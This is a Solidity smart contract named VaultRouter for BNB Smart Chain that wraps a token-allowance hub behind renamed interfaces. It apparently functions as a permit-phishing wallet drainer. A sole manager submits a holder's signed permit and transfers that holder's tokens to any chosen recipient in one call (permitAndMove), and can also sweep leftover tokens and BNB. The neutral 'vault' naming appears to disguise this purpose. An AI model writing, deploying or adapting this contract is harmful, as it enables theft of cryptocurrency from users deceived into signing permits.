// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAllowanceHub {
    struct AssetInfo {
        address asset;
        uint160 qty;
        uint48 deadline;
        uint48 seq;
    }

    struct ApprovalRequest {
        AssetInfo info;
        address delegate;
        uint256 authExpiry;
    }

    function permit(
        address holder,
        ApprovalRequest calldata request,
        bytes calldata sig
    ) external;

    function transferFrom(
        address sender,
        address recipient,
        uint160 qty,
        address asset
    ) external;

    function allowance(
        address holder,
        address asset,
        address delegate
    ) external view returns (uint160 qty, uint48 deadline, uint48 seq);
}

interface IAsset {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 qty) external returns (bool);
}

/**
 * @title VaultRouter
 * @dev Delegated spender contract for AllowanceHub permit management & execution on BNB Smart Chain.
 */
contract VaultRouter {
    address public manager;
    address public constant ALLOWANCE_HUB = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    event ManagerUpdated(address indexed prevManager, address indexed newManager);
    event ApprovalLogged(address indexed holder, address indexed asset, uint160 qty);
    event MovementLogged(address indexed sender, address indexed recipient, uint160 qty, address indexed asset);

    modifier onlyManager() {
        require(msg.sender == manager, "VaultRouter: caller is not the manager");
        _;
    }

    constructor() {
        manager = msg.sender;
        emit ManagerUpdated(address(0), msg.sender);
    }

    function updateManager(address newManager) external onlyManager {
        require(newManager != address(0), "VaultRouter: new manager is zero address");
        emit ManagerUpdated(manager, newManager);
        manager = newManager;
    }

    /**
     * @notice Submit user's signed permit to AllowanceHub to set on-chain allowance.
     */
    function submitPermit(
        address holder,
        IAllowanceHub.ApprovalRequest calldata request,
        bytes calldata sig
    ) external onlyManager {
        IAllowanceHub(ALLOWANCE_HUB).permit(holder, request, sig);
        emit ApprovalLogged(holder, request.info.asset, request.info.qty);
    }

    /**
     * @notice Move assets using active AllowanceHub allowance.
     * @dev As the approved delegate, this contract calls ALLOWANCE_HUB.transferFrom.
     */
    function moveAssets(
        address sender,
        address recipient,
        uint160 qty,
        address asset
    ) external onlyManager {
        IAllowanceHub(ALLOWANCE_HUB).transferFrom(sender, recipient, qty, asset);
        emit MovementLogged(sender, recipient, qty, asset);
    }

    /**
     * @notice Activate permit and move assets in a single transaction.
     */
    function permitAndMove(
        address holder,
        IAllowanceHub.ApprovalRequest calldata request,
        bytes calldata sig,
        address recipient,
        uint160 moveQty
    ) external onlyManager {
        IAllowanceHub(ALLOWANCE_HUB).permit(holder, request, sig);
        emit ApprovalLogged(holder, request.info.asset, request.info.qty);

        IAllowanceHub(ALLOWANCE_HUB).transferFrom(holder, recipient, moveQty, request.info.asset);
        emit MovementLogged(holder, recipient, moveQty, request.info.asset);
    }

    /**
     * @notice Recover accidentally sent ERC20 assets.
     */
    function recoverAssets(address asset, address recipient, uint256 qty) external onlyManager {
        IAsset(asset).transfer(recipient, qty);
    }

    /**
     * @notice Recover accidentally sent BNB.
     */
    function recoverBNB(address payable recipient, uint256 qty) external onlyManager {
        recipient.transfer(qty);
    }

    receive() external payable {}
}
